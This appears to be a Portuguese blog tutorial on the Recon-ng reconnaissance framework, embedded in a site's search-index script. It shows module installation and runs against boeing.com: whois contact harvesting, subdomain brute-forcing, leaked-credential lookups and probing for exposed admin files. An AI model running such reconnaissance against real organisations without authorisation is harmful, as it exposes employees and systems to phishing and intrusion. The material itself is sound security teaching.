recon/domains-hosts/mx_spf_ip | 1.0 | not installed | 2019-06-24 | | | | recon/domains-hosts/netcraft | 1.1 | not installed | 2020-02-05 | | | | recon/domains-hosts/shodan_hostname | 1.1 | not installed | 2020-07-01 | * | * | | recon/domains-hosts/ssl_san | 1.0 | not installed | 2019-06-24 | | | | recon/domains-hosts/threatcrowd | 1.0 | not installed | 2019-06-24 | | | | recon/domains-hosts/threatminer | 1.0 | not installed | 2019-06-24 | | | | recon/domains-vulnerabilities/ghdb | 1.1 | not installed | 2019-06-26 | | | | recon/domains-vulnerabilities/xssed | 1.0 | not installed | 2019-06-24 | | | | recon/hosts-domains/migrate_hosts | 1.1 | not installed | 2020-05-17 | | | | recon/hosts-hosts/bing_ip | 1.0 | not installed | 2019-06-24 | | * | | recon/hosts-hosts/censys_hostname | 1.0 | not installed | 2019-08-22 | | * | | recon/hosts-hosts/censys_ip | 1.0 | not installed | 2019-08-22 | | * | | recon/hosts-hosts/censys_query | 1.0 | not installed | 2019-08-22 | | * | | recon/hosts-hosts/ipinfodb | 1.1 | not installed | 2020-06-08 | | * | | recon/hosts-hosts/ipstack | 1.0 | not installed | 2019-06-24 | | * | | recon/hosts-hosts/resolve | 1.0 | not installed | 2019-06-24 | | | | recon/hosts-hosts/reverse_resolve | 1.0 | not installed | 2019-06-24 | | | | recon/hosts-hosts/ssltools | 1.0 | not installed | 2019-06-24 | | | | recon/hosts-hosts/virustotal | 1.0 | not installed | 2019-06-24 | | * | | recon/hosts-locations/migrate_hosts | 1.0 | not installed | 2019-06-24 | | | | recon/hosts-ports/binaryedge | 1.0 | not installed | 2019-06-24 | | * | | recon/hosts-ports/shodan_ip | 1.2 | not installed | 2020-07-01 | * | * | | recon/locations-locations/geocode | 1.0 | not installed | 2019-06-24 | | * | | recon/locations-locations/reverse_geocode | 1.0 | not installed | 2019-06-24 | | * | | recon/locations-pushpins/flickr | 1.0 | not installed | 2019-06-24 | | * | | recon/locations-pushpins/shodan | 1.1 | not installed | 2020-07-01 | | * | | recon/locations-pushpins/twitter | 1.1 | not installed | 2019-10-17 | | * | | recon/locations-pushpins/youtube | 1.1 | not installed | 2019-10-15 | | * | | recon/netblocks-companies/censys_netblock_company | 1.0 | not installed | 2019-08-22 | | * | | recon/netblocks-companies/whois_orgs | 1.0 | not installed | 2019-06-24 | | | | recon/netblocks-hosts/censys_netblock | 1.0 | not installed | 2019-08-22 | | * | | recon/netblocks-hosts/reverse_resolve | 1.0 | not installed | 2019-06-24 | | | | recon/netblocks-hosts/shodan_net | 1.1 | installed | 2020-07-01 | * | * | | recon/netblocks-hosts/virustotal | 1.0 | not installed | 2019-06-24 | | * | | recon/netblocks-ports/census_2012 | 1.0 | not installed | 2019-06-24 | | | | recon/netblocks-ports/censysio | 1.0 | not installed | 2019-06-24 | | * | | recon/ports-hosts/migrate_ports | 1.0 | not installed | 2019-06-24 | | | | recon/ports-hosts/ssl_scan | 1.0 | not installed | 2020-04-13 | | | | recon/profiles-contacts/bing_linkedin_contacts | 1.1 | not installed | 2019-10-08 | | * | | recon/profiles-contacts/dev_diver | 1.1 | not installed | 2020-05-15 | | | | recon/profiles-contacts/github_users | 1.0 | not installed | 2019-06-24 | | * | | recon/profiles-profiles/namechk | 1.0 | not installed | 2019-06-24 | | * | | recon/profiles-profiles/profiler | 1.0 | not installed | 2019-06-24 | | | | recon/profiles-profiles/twitter_mentioned | 1.0 | not installed | 2019-06-24 | | * | | recon/profiles-profiles/twitter_mentions | 1.0 | not installed | 2019-06-24 | | * | | recon/profiles-repositories/github_repos | 1.1 | not installed | 2020-05-15 | | * | | recon/repositories-profiles/github_commits | 1.0 | not installed | 2019-06-24 | | * | | recon/repositories-vulnerabilities/gists_search | 1.0 | not installed | 2019-06-24 | | | | recon/repositories-vulnerabilities/github_dorks | 1.0 | not installed | 2019-06-24 | | * | | reporting/csv | 1.0 | not installed | 2019-06-24 | | | | reporting/html | 1.0 | not installed | 2019-06-24 | | | | reporting/json | 1.0 | not installed | 2019-06-24 | | | | reporting/list | 1.0 | not installed | 2019-06-24 | | | | reporting/proxifier | 1.0 | not installed | 2019-06-24 | | | | reporting/pushpin | 1.0 | not installed | 2019-06-24 | | * | | reporting/xlsx | 1.0 | not installed | 2019-06-24 | | | | reporting/xml | 1.1 | not installed | 2019-06-24 | | | +---------------------------------------------------------------------------------------------------+ D = Has dependencies. See info for details. K = Requires keys. See info for details.Em nosso exemplo, iremos utilizar os seguintes módulos para realizar nosso trabalho.
| Path | Version | Status | Updated | D | K | Como Configurar | | ------------------------------------------- | ------- | ------------- | ---------- | --- | --- | --------------- | | recon/companies-multi/whois_miner | 1.1 | not installed | 2019-10-15 | | | | | recon/domains-hosts/google_site_web | 1.0 | not installed | 2019-06-24 | | | | | recon/domains-hosts/brute_hosts | 1.0 | not installed | 2019-06-24 | | | | | recon/domains-hosts/netcraft | 1.1 | not installed | 2020-02-05 | | | | | recon/hosts-hosts/resolve | 1.0 | not installed | 2019-06-24 | | | | | recon/hosts-hosts/reverse_resolve | 1.0 | not installed | 2019-06-24 | | | | | discovery/info_disclosure/interesting_files | 1.1 | not installed | 2020-01-13 | | | | | recon/hosts-hosts/ipinfodb | 1.1 | not installed | 2020-06-08 | | * | Aqui! | | recon/domains-contacts/whois_pocs | 1.0 | not installed | 2019-06-24 | | | | | recon/contacts-credentials/hibp_paste | 1.2 | not installed | 2019-09-10 | | * | Aqui! | | recon/companies-multi/github_miner | 1.1 | not installed | 2020-05-15 | | * | Aqui! | | recon/hosts-ports/shodan_ip | 1.2 | not installed | 2020-07-01 | * | * | Aqui! | | recon/domains-hosts/shodan_hostname | 1.1 | not installed | 2020-07-01 | * | * | Aqui! | | recon/netblocks-hosts/shodan_net | 1.1 | installed | 2020-07-01 | * | * | Aqui! | | reporting/html | 1.0 | not installed | 2019-06-24 | | | |Atenção para a configuração das keys das APIs necessárias. Utilize os link acima para a configuração ou role a página para o fim do post para o passo a passo. A ordem entre configurar e instalar não importa,
Instalando módulos &nbsp; Vamos instalar todos os módulos que separamos para o nosso teste. Até a versão atual que estou testando, a v5.1.1, só é possível instalar um módulo de cada vez. 😑
[recon-ng] &gt; marketplace install whois-miner [recon-ng] &gt; marketplace install google_site_web [recon-ng] &gt; marketplace install brute_hosts [recon-ng] &gt; marketplace install netcraft [recon-ng] &gt; marketplace install resolve [recon-ng] &gt; marketplace install reverse_resolve [recon-ng] &gt; marketplace install interesting_files [recon-ng] &gt; marketplace install ipinfodb [recon-ng] &gt; marketplace install whois_pocs [recon-ng] &gt; marketplace install hibp_paste [recon-ng] &gt; marketplace install scylla [recon-ng] &gt; marketplace install github_miner [recon-ng] &gt; marketplace install shodan_ip [recon-ng] &gt; marketplace install shodan_hostname [recon-ng] &gt; marketplace install shodan_net [recon-ng] &gt; marketplace install html Executando os módulos e obtendo informações &nbsp; Com os nossos módulos instalados, vamos configurá-los e executá-los.
whois_miner &nbsp; Neste, vamos deixar a opção default e executar.
[recon-ng][tiagotavares.io] &gt; modules load whois_miner [recon-ng][tiagotavares.io][whois_miner] &gt; info Name: Whois Data Miner Author: Tim Tomes (@lanmaster53) Version: 1.1 Description: Uses the ARIN Whois RWS to harvest companies, locations, netblocks, and contacts associated with the given company search string. Updates the respective tables with the results. Options: Name Current Value Required Description ------ ------------- -------- ----------- SOURCE default yes source of input (see &#39;info&#39; for details) Source Options: default SELECT DISTINCT company FROM companies WHERE company IS NOT NULL &lt;string&gt; string representing a single input &lt;path&gt; path to a file containing a list of inputs query &lt;sql&gt; database query returning one column of inputs Comments: * Wildcard searches are allowed using the &#34;*&#34; character. * Validate results of the SEARCH string with these URLs: - http://whois.arin.net/rest/orgs;name=&lt;SEARCH&gt; - http://whois.arin.net/rest/customers;name=&lt;SEARCH&gt;[recon-ng][tiagotavares.io][whois_miner] &gt; options set SOURCE boeing[recon-ng][tiagotavares.io][whois_miner] &gt; run [*] URL: http://whois.arin.net/rest/orgs;name=boeing [*] No ORGS found. [*] URL: http://whois.arin.net/rest/customers;name=boeing [*] No CUSTOMERS found. whois_pocs &nbsp; [recon-ng][tiagotavares.io] &gt; modules load whois_pocs [recon-ng][tiagotavares.io][whois_pocs] &gt; info Name: Whois POC Harvester Author: Tim Tomes (@lanmaster53) Version: 1.0 Description: Uses the ARIN Whois RWS to harvest POC data from whois queries for the given domain. Updates the &#39;contacts&#39; table with the results. Options: Name Current Value Required Description ------ ------------- -------- ----------- SOURCE default yes source of input (see &#39;info&#39; for details) Source Options: default SELECT DISTINCT domain FROM domains WHERE domain IS NOT NULL &lt;string&gt; string representing a single input &lt;path&gt; path to a file containing a list of inputs query &lt;sql&gt; database query returning one column of inputs [recon-ng][tiagotavares.io][whois_pocs] &gt; [recon-ng][tiagotavares.io][whois_pocs] &gt; options set SOURCE boeing.com[recon-ng][tiagotavares.io][whois_pocs] &gt; run ... ... ... [*] -------------------------------------------------- [*] URL: http://whois.arin.net/rest/poc/AWO19-ARIN [*] Country: United States [*] Email: JohnDoe@boeing.com [*] First_Name: Al [*] Last_Name: Wood [*] Middle_Name: None [*] Notes: None [*] Phone: None [*] Region: Seal Beach, CA [*] Title: Whois contact [*] -------------------------------------------------- ------- SUMMARY ------- [*] 159 total (80 new) contacts found. [recon-ng][tiagotavares.io][whois_pocs] &gt; google_site_web &nbsp; [recon-ng][tiagotavares.io] &gt; modules load google_site_webConfigure o domínio inicial que será realizada a busca.
[recon-ng][tiagotavares.io][google_site_web] &gt; options set SOURCE boeing.comRode o módulo. Abaixo foram identificado 27 hosts, mas a busca parou após o Captcha do Google, que precisará ser bypassado.
[recon-ng][tiagotavares.io][google_site_web] &gt; run ---------- BOEING.COM ---------- ... ... ... ... Google CAPTCHA triggered. No bypass available. ------- SUMMARY ------- [*] 27 total (27 new) hosts found. brute_hosts &nbsp; [recon-ng][tiagotavares.io] &gt; modules load brute_hosts [recon-ng][tiagotavares.io][brute_hosts] &gt; options set SOURCE boeing.com [recon-ng][tiagotavares.io][brute_hosts] &gt; run ... ... ... [*] zera.boeing.com =&gt; No record found. [*] zeus.boeing.com =&gt; No record found. [*] zlog.boeing.com =&gt; No record found. [*] zm.boeing.com =&gt; No record found. [*] zulu.boeing.com =&gt; No record found. [*] zw.boeing.com =&gt; No record found. ------- SUMMARY ------- [*] 55 total (42 new) hosts found. ipinfodb &nbsp; [recon-ng][tiagotavares.io] &gt; modules load infodb [recon-ng][tiagotavares.io][ipinfodb] &gt; info Name: IPInfoDB GeoIP Author: Tim Tomes (@lanmaster53) Version: 1.1 Keys: ipinfodb_api Description: Leverages the ipinfodb.com API to geolocate a host by IP address. Updates the &#39;hosts&#39; table with the results. Options: Name Current Value Required Description ------ ------------- -------- ----------- LIMIT True yes toggle rate limiting SOURCE default yes source of input (see &#39;info&#39; for details) Source Options: default SELECT DISTINCT ip_address FROM hosts WHERE ip_address IS NOT NULL &lt;string&gt; string representing a single input &lt;path&gt; path to a file containing a list of inputs query &lt;sql&gt; database query returning one column of inputs Comments: * Free API access requires the use of rate limiting.[recon-ng][tiagotavares.io][ipinfodb] &gt; run shodan_ip &nbsp; [recon-ng][tiagotavares.io] &gt; modules load shodan_ip [recon-ng][tiagotavares.io][shodan_ip] &gt; info Name: Shodan IP Enumerator Author: Tim Tomes (@lanmaster53) and Matt Puckett (@t3lc0) &amp; Ryan Hays (@_ryanhays) Version: 1.2 Keys: shodan_api Description: Harvests port information from the Shodan API by using the &#39;ip&#39; search operator. Updates the &#39;ports&#39; table with the results. Options: Name Current Value Required Description ------ ------------- -------- ----------- LIMIT 1 yes limit number of api requests per input source (0 = unlimited) SOURCE default yes source of input (see &#39;info&#39; for details) Source Options: default SELECT DISTINCT ip_address FROM hosts WHERE ip_address IS NOT NULL &lt;string&gt; string representing a single input &lt;path&gt; path to a file containing a list of inputs query &lt;sql&gt; database query returning one column of inputsNão é necessário realizar nenhum configuração adicional além das configurações de chave de API.
[recon-ng][tiagotavares.io][shodan_ip] &gt; run ... ... ... ------- SUMMARY ------- [*] 15 total (13 new) ports found. netcraft &nbsp; [recon-ng][tiagotavares.io] &gt; modules load netcraft [recon-ng][tiagotavares.io][netcraft] &gt; info Name: Netcraft Hostname Enumerator Author: thrapt (thrapt@gmail.com) Version: 1.1 Description: Harvests hosts from Netcraft.com. Updates the &#39;hosts&#39; table with the results. Options: Name Current Value Required Description ------ ------------- -------- ----------- SOURCE default yes source of input (see &#39;info&#39; for details) Source Options: default SELECT DISTINCT domain FROM domains WHERE domain IS NOT NULL &lt;string&gt; string representing a single input &lt;path&gt; path to a file containing a list of inputs query &lt;sql&gt; database query returning one column of inputs[recon-ng][tiagotavares.io][netcraft] &gt; options set SOURCE boeing.com[recon-ng][tiagotavares.io][netcraft] &gt; run ... ... ... ------- SUMMARY ------- [*] 9 total (2 new) hosts found. resolve &nbsp; [recon-ng][tiagotavares.io] &gt; modules load recon/hosts-hosts/resolve [recon-ng][tiagotavares.io][resolve] &gt; info Name: Hostname Resolver Author: Tim Tomes (@lanmaster53) Version: 1.0 Description: Resolves the IP address for a host. Updates the &#39;hosts&#39; table with the results. Options: Name Current Value Required Description ------ ------------- -------- ----------- SOURCE default yes source of input (see &#39;info&#39; for details) Source Options: default SELECT DISTINCT host FROM hosts WHERE host IS NOT NULL AND ip_address IS NULL &lt;string&gt; string representing a single input &lt;path&gt; path to a file containing a list of inputs query &lt;sql&gt; database query returning one column of inputs Comments: * Note: Nameserver must be in IP form. [recon-ng][tiagotavares.io][resolve] &gt; Aqui não configuraremos nada! Pois ele obterá o IP dos domínios já obtidos!
[recon-ng][tiagotavares.io][resolve] &gt; run ... ... ... [*] active.boeing.com =&gt; 130.76.22.22 [*] securelogon.boeing.com =&gt; 130.76.144.230 [*] securelogon.boeing.com =&gt; 130.76.144.227 ------- SUMMARY ------- [*] 21 total (21 new) hosts found. [recon-ng][tiagotavares.io][resolve] &gt; reverse_resolve &nbsp; [recon-ng][tiagotavares.io] &gt; modules load recon/hosts-hosts/reverse_resolve [recon-ng][tiagotavares.io][reverse_resolve] &gt; info Name: Reverse Resolver Author: John Babio (@3vi1john), @vulp1n3, and Tim Tomes (@lanmaster53) Version: 1.0 Description: Conducts a reverse lookup for each IP address to resolve the hostname. Updates the &#39;hosts&#39; table with the results. Options: Name Current Value Required Description ------ ------------- -------- ----------- SOURCE default yes source of input (see &#39;info&#39; for details) Source Options: default SELECT DISTINCT ip_address FROM hosts WHERE ip_address IS NOT NULL &lt;string&gt; string representing a single input &lt;path&gt; path to a file containing a list of inputs query &lt;sql&gt; database query returning one column of inputs [recon-ng][tiagotavares.io][reverse_resolve] &gt;[recon-ng][tiagotavares.io][reverse_resolve] &gt; run ... ... ... ------- SUMMARY ------- [*] 89 total (11 new) hosts found. hibp_paste &nbsp; [recon-ng][tiagotavares.io] &gt; modules load hibp_paste [recon-ng][tiagotavares.io][hibp_paste] &gt; info Name: Have I been pwned? Paste Search Author: Tim Tomes (@lanmaster53) and Geoff Pamerleau (@_geoff_p_) Version: 1.1 Keys: hibp_api Description: Leverages the haveibeenpwned.com API to determine if email addresses have been published to various paste sites. Adds compromised email addresses to the &#39;credentials&#39; table. Options: Name Current Value Required Description -------- ------------- -------- ----------- DOWNLOAD True yes download pastes SOURCE default yes source of input (see &#39;info&#39; for details) Source Options: default SELECT DISTINCT email FROM contacts WHERE email IS NOT NULL &lt;string&gt; string representing a single input &lt;path&gt; path to a file containing a list of inputs query &lt;sql&gt; database query returning one column of inputs Comments: * Paste sites supported: Pastebin, Pastie, Slexy, Ghostbin, QuickLeak, JustPaste, AdHocUrl, and OptOut.The HIBP API is rate limited to 1 request per 1.5 seconds.[recon-ng][tiagotavares.io][hibp_paste] &gt; run [*] -------------------------------------------------- [*] Hash: None [*] Leak: None [*] Notes: None [*] Password: None [*] Type: None [*] Username: LeakedEmail@boeing.com [*] -------------------------------------------------- ... ... ... [*] john.doe@boeing.com =&gt; Not Found. ------- SUMMARY ------- [*] 4 total (0 new) contacts found. [*] 4 total (4 new) credentials found. github_miner &nbsp; [recon-ng][tiagotavares.io] &gt; modules load github_miner [recon-ng][tiagotavares.io][github_miner] &gt; info Name: Github Resource Miner Author: Tim Tomes (@lanmaster53) Version: 1.1 Keys: github_api Description: Uses the Github API to enumerate repositories and member profiles associated with a company search string. Updates the respective tables with the results. Options: Name Current Value Required Description ----------- ------------- -------- ----------- IGNOREFORKS True yes ignore forks SOURCE default yes source of input (see &#39;info&#39; for details) Source Options: default SELECT DISTINCT company FROM companies WHERE company IS NOT NULL &lt;string&gt; string representing a single input &lt;path&gt; path to a file containing a list of inputs query &lt;sql&gt; database query returning one column of inputs [recon-ng][tiagotavares.io][github_miner] &gt; run ------ BOEING ------ interesting_files &nbsp; [recon-ng][tiagotavares.io] &gt; modules load interesting_files [recon-ng][tiagotavares.io][interesting_files] &gt; info Name: Interesting File Finder Author: Tim Tomes (@lanmaster53), thrapt (thrapt@gmail.com), Jay Turla (@shipcod3), and Mark Jeffery Version: 1.1 Description: Checks hosts for interesting files in predictable locations. Options: Name Current Value Required Description -------- ------------- -------- ----------- DOWNLOAD True yes download discovered files PORT 80 yes request port PROTOCOL http yes request protocol SOURCE default yes source of input (see &#39;info&#39; for details) Source Options: default SELECT DISTINCT host FROM hosts WHERE host IS NOT NULL &lt;string&gt; string representing a single input &lt;path&gt; path to a file containing a list of inputs query &lt;sql&gt; database query returning one column of inputs Comments: * Files: robots.txt, sitemap.xml, sitemap.xml.gz, crossdomain.xml, phpinfo.php, test.php, elmah.axd, server-status, jmx-console/, admin-console/, web-console/ * Google Dorks: - inurl:robots.txt ext:txt - inurl:elmah.axd ext:axd intitle:&#34;Error log for&#34; - inurl:server-status &#34;Apache Status&#34; [recon-ng][tiagotavares.io][interesting_files] &gt;Vai demorar um bocado esta parte, você pode ir dormir e voltar para obter o resultado. Porque ele vai analisar cada domínio e subdomínio.
[recon-ng][tiagotavares.io][interesting_files] &gt; run [*] http://m.shop.boeing.com:80/robots.txt =&gt; 404 [*] http://m.shop.boeing.com:80/sitemap.xml =&gt; 404 [*] http://m.shop.boeing.com:80/sitemap.xml.gz =&gt; 404 [*] http://m.shop.boeing.com:80/crossdomain.xml =&gt; 404 [*] http://m.shop.boeing.com:80/phpinfo.php =&gt; 404 [*] http://m.shop.boeing.com:80/test.php =&gt; 404 [*] http://m.shop.boeing.com:80/elmah.axd =&gt; 404 [*] http://m.shop.boeing.com:80/server-status =&gt; 404 [*] http://m.shop.boeing.com:80/jmx-console/ =&gt; Error [*] http://m.shop.boeing.com:80/admin-console/ =&gt; Error [*] http://m.shop.boeing.com:80/web-console/ =&gt; Error [*] http://mft.boeing.com:80/robots.txt =&gt; Error ... Exibindo na tela informações coletadas &nbsp; Antes de se gerar qualquer relatório, podemos visualizar todas as informações que estão organizadas em categorias. Estas categorias podem ser listadas e exibidas como no exemplo abaixo.
[recon-ng][tiagotavares.io] &gt; show &lt;TAB&gt; companies hosts ports vulnerabilities contacts leaks profiles credentials locations pushpins domains netblocks repositories Mostrando todos os hosts coletados em nosso trabalho.
[recon-ng][tiagotavares.io] &gt; show hosts Criando Relatório &nbsp; html &nbsp; [recon-ng][tiagotavares.io] &gt; modules load html [recon-ng][tiagotavares.io][html] &gt; info Name: HTML Report Generator Author: Tim Tomes (@lanmaster53) Version: 1.0 Description: Creates an HTML report. Options: Name Current Value Required Description -------- ------------- -------- ----------- CREATOR yes use creator name in the report footer CUSTOMER yes use customer name in the report header FILENAME /root/.recon-ng/workspaces/tiagotavares.io/results.html yes path and filename for report output SANITIZE True yes mask sensitive data in the report[recon-ng][tiagotavares.io][html] &gt; options set CREATOR TT CREATOR =&gt; TT [recon-ng][tiagotavares.io][html] &gt; options set CUSTOMER Boeing CUSTOMER =&gt; Boeing[recon-ng][tiagotavares.io][html] &gt; run [*] Report generated at &#39;/root/.recon-ng/workspaces/tiagotavares.io/results.html&#39;.Agora basta abrir o nosso relatório em HTML.
root@kali:~# firefox /root/.recon-ng/workspaces/tiagotavares.io/results.html Recon-web &nbsp; No capítulo anterior foi mostrar a geração de um relatório em HTML e também como exibir resultados na tela do terminal, mas é possível acessar as informações em uma plataforma web com o recon-web.
root@kali:~# recon-web ************************************************************************* * Welcome to Recon-web, the analytics and reporting engine for Recon-ng! * This is a web-based user interface. Open the URL below in your browser to begin. * Recon-web includes the Recon-API, which can be accessed via the \`/api/\` URL. ************************************************************************* [*] Marketplace disabled. [*] Version check disabled. * Workspace initialized: default * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit) Escolha o workspace onde realizou o trabalho anterior.
Agora você pode exibir as informações das tabelas de informações criadas pelo Recon-NG, criando filtros e exportando no formato que desejar.
Conclusão &nbsp; A única coisa que posso concluir sem enrolação é que este framework e seus módulos podem perfeitamente substituir uma infinidade de ferramentas que você utiliza para realizar o reconhecimento de organizações, sem muito trabalho para configuração e maleável para trabalhar em qualquer tipo de ambiente, como por exemplo em containers.
Obrigado pela sua atenção e use o campo de comentários para para comentar e criticar! 😃
Apêndice I - Configuração de APIs &nbsp; IPinfoDB &nbsp; Site: https://ipinfodb.com/
Módulos dependentes deste tutorial: ipinfodb
Procedimento:
Crie uma conta ou utilize sua conta do Google para facilitar a criação.
Infelizmente ele só vai permitir resquisições após especificar exatamente de qual iP serão feitas.
Agora é só copiar a chave de API&hellip;
&hellip; e configurar o recon-ng.
[recon-ng][tiagotavares.io] &gt; keys add ipinfodb_api 94cfe253....a790 [*] Key &#39;ipinfodb_api&#39; added. Github &nbsp; Site: https://github.com/
Módulos dependentes deste tutorial: github_api
Procedimento:
Crie um perfil no Github caso não possua.
Vá até a opção Settings.
Depois procure pela opção Developer settings &ndash;&gt; Personal access tokens &ndash;&gt; Generate new token.
Para fins de teste, vamos apenas dar a permissão de acessar repositórios públicos.
Pronto! Assim como diz mensagem, copie o token e guarde caso precise para outros fins, pois uma vez configurado no recon-ng o token ficará salvo.
Adicionando a chave no recon-ng.
[recon-ng][tiagotavares.io] &gt; keys add github_api 00783.... [*] Key &#39;github_api&#39; added. HaveIBeenPwned &nbsp; Site: https://haveibeenpwned.com/
Preço: US$3,50
Módulos dependentes deste tutorial: hibp_api
Procedimento:
Acesse o link de API. Em seguida preencha com seu email.
Logo em seguida você receberá um email para confirmação. Basta clicar em Verify my email.
Para testar, vou comprar um mês de licença.
Pronto, temos a nossa chave!
Agora vamos adicionar a chave ao recon-ng.
[recon-ng][tiagotavares.io] &gt; keys add hibp_api d8e... [*] Key &#39;hibp_api&#39; added. Shodan &nbsp; Site: https://www.shodan.io/
Módulos dependentes deste tutorial: shodan_hostname, shodan_ip, shodan_net
Procedimento:
Acesse a sua conta ou crie uma caso necessário. Depois clique em My Account.
Depois é só copiar a chave de API gerada por ele.
Vamos adicionar a chave ao recon-ng.
[recon-ng][tiagotavares.io] &gt; keys add shodan_api WaI93t..... [*] Key &#39;shodan_api&#39; added.`}).add({id:126,tag:"en",href:"/tags/red-team/",title:"Red Team",description:"",content:""}).add({id:127,tag:"en",href:"/tags/research/",title:"Research",description:"",content:""}).add({id:128,tag:"en",href:"/tags/resili%C3%AAncia/",title:"Resiliência",description:"",content:""}).add({id:129,tag:"en",href:"/tags/running/",title:"Running",description:"",content:""}).add({id:130,tag:"en",href:"/tags/safari/",title:"Safari",description:"",content:""}).add({id:131,tag:"en",href:"/projects/sample-project/",title:"Sample project",description:"A sample project.",content:"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."}).add({id:132,tag:"en",href:"/tags/sast/",title:"Sast",description:"",content:""}).add({id:133,tag:"en",href:"/tags/scanner/",title:"Scanner",description:"",content:""}).add({id:134,tag:"en",href:"/tags/seaborn/",title:"Seaborn",description:"",content:""}).add({id:135,tag:"en",href:"/tags/security/",title:"Security",description:"",content:""}).add({id:136,tag:"en",href:"/tags/security-champions/",title:"Security Champions",description:"",content:""}).add({id:137,tag:"en",href:"/tags/strava/",title:"Strava",description:"",content:""}).add({id:138,tag:"en",href:"/tags/study/",title:"Study",description:"",content:""}).add({id:139,tag:"en",href:"/tags/",title:"Tags",description:"",content:""}).add({id:140,tag:"en",href:"/tags/tip/",title:"Tip",description:"",content:""}).add({id:141,tag:"en",href:"/tags/ubuntu/",title:"Ubuntu",description:"",content:""}).add({id:142,tag:"en",href:"/tags/vida/",title:"Vida",description:"",content:""}).add({id:143,tag:"en",href:"/tags/vulnerability/",title:"Vulnerability",description:"",content:""}).add({id:144,tag:"en",href:"/tags/vulnerable-machines/",title:"Vulnerable Machines",description:"",content:""}).add({id:145,tag:"en",href:"/tags/vulnhub/",title:"Vulnhub",description:"",content:""}).add({id:146,tag:"en",href:"/tags/walkthrough/",title:"Walkthrough",description:"",content:""}).add({id:147,tag:"en",href:"/tags/walkthroughs/",title:"Walkthroughs",description:"",content:""}).add({id:148,tag:"en",href:"/tags/writeup/",title:"Writeup",description:"",content:""}).add({id:149,tag:"en",href:"/tags/wss/",title:"Wss",description:"",content:""}).add({id:150,tag:"en",href:"/tags/zwift/",title:"Zwift",description:"",content:""}),search.addEventListener("input",showResults,!0)}function hideSuggestions(e){var isClickInsideElement=suggestions.contains(e.target);isClickInsideElement||(suggestions.classList.add("d-none"),background!==null&&background.style.setProperty("--image-opacity","0.1"))}function inputFocus(e){e.ctrlKey&&e.key==="/"&&(e.preventDefault(),search.focus()),e.key==="Escape"&&(search.blur(),suggestions.classList.add("d-none"))}function suggestionFocus(e){const suggestionsHidden=suggestions.classList.contains("d-none");if(suggestionsHidden)return;const focusableSuggestions=[...suggestions.querySelectorAll("a")];if(focusableSuggestions.length===0)return;const index=focusableSuggestions.indexOf(document.activeElement);if(e.key==="ArrowUp"){e.preventDefault();const nextIndex=index>0?index-1:0;focusableSuggestions[nextIndex].focus()}else if(e.key==="ArrowDown"){e.preventDefault();const nextIndex=index+1<focusableSuggestions.length?index+1:index;focusableSuggestions[nextIndex].focus()}}function showResults(){const maxResult=5;var searchQuery=this.value;const lang=document.documentElement.lang;var results=null;searchQuery?(results=index.search(searchQuery,{index:["title","description","content"],limit:maxResult,tag:lang,enrich:!0}),background!==null&&background.style.setProperty("--image-opacity","0")):background!==null&&background.style.setProperty("--image-opacity","0.1");const flatResults=new Map;if(results!==null)for(const result of results.flatMap(r=>r.result)){if(flatResults.has(result.doc.href))continue;flatResults.set(result.doc.href,result.doc)}if(suggestions.innerHTML="",suggestions.classList.remove("d-none"),flatResults.size===0&&searchQuery){const msg=suggestions.dataset.noResults,noResultsMessage=document.createElement("div");noResultsMessage.innerHTML=`${msg} "<strong>${searchQuery}</strong>"`,noResultsMessage.classList.add("suggestion__no-results"),suggestions.appendChild(noResultsMessage);return}for(const[href,doc]of flatResults){const entry=document.createElement("div");suggestions.appendChild(entry);const a=document.createElement("a");a.href=href,entry.appendChild(a);const title=document.createElement("span");title.classList.add("text-start"),title.textContent=doc.title,title.classList.add("suggestion__title"),a.appendChild(title);const description=document.createElement("span");if(description.textContent=doc.description,description.classList.add("suggestion__description"),a.appendChild(description),suggestions.appendChild(entry),suggestions.childElementCount==maxResult)break}}search!==null&&suggestions!==null&&(document.addEventListener("keydown",inputFocus),document.addEventListener("keydown",suggestionFocus),document.addEventListener("click",hideSuggestions),initIndex());const searchModal=document.getElementById("search-modal");searchModal!==null&&searchModal.addEventListener("shown.bs.modal",function(){const searchInput=document.getElementById("search-input-modal");searchInput!==null&&searchInput.focus({focusVisible:!0})}),document.querySelectorAll(".dynamic-svg").forEach(placeholder=>{placeholder.onload=function(){const container=placeholder.parentElement,doc=placeholder.contentDocument,attr=placeholder.getAttribute("data-class"),style=placeholder.getAttribute("data-style");if(container!==null&&doc!==null){const svg=doc.querySelector("svg");svg!==null&&(svg.setAttribute("class","svg-inline--fa "+(attr||"")),svg.setAttribute("fill","currentcolor"),svg.setAttribute("aria-hidden","true"),svg.setAttribute("role","img"),style!==null&&style!==""&&svg.setAttribute("style",style),svg.removeAttribute("height"),svg.removeAttribute("width"),container.innerHTML="",container.appendChild(svg))}}});const navbar=document.querySelector(".navbar"),togglers=document.querySelectorAll(".main-nav-toggler"),modeSelectors=document.querySelectorAll(".switch-mode-collapsed"),colorsBG=["body","secondary","tertiary"];function updateNavbar(){if(window.scrollY>75){navbar.classList.add("nav-active");const storedTheme=localStorage.getItem("theme");navbar.setAttribute("data-bs-theme",storedTheme)}else{navbar.classList.remove("nav-active");const defaultTheme=navbar.getAttribute("data-bs-overlay");navbar.setAttribute("data-bs-theme",defaultTheme)}}if(navbar!==null&&window.performance.getEntriesByType&&window.performance.getEntriesByType("navigation")[0].type==="reload"&&updateNavbar(),navbar!==null&&togglers!==null){const html=document.querySelector("html"),config={attributes:!0,attributeFilter:["data-bs-theme"]},Observer=new MutationObserver(mutationrecords=>{updateNavbar()});Observer.observe(html,config);const color=navbar.getAttribute("data-navbar-color")||"body",bg=colorsBG.includes(color)?`var(--bs-${color}-bg)`:`var(--bs-navbar-color-${color})`;navbar.style.setProperty("--bs-navbar-expanded-color",bg),window.onscroll=()=>{updateNavbar()};for(let i=0;i<togglers.length;++i)togglers[i].onclick=()=>{navbar.classList.toggle("navbar-expanded")};for(let i=0;i<modeSelectors.length;++i)modeSelectors[i].onclick=()=>{for(let j=0;j<togglers.length;++j){const toggler=togglers[j];toggler.getAttribute("aria-expanded")==="true"&&toggler.click()}}}const 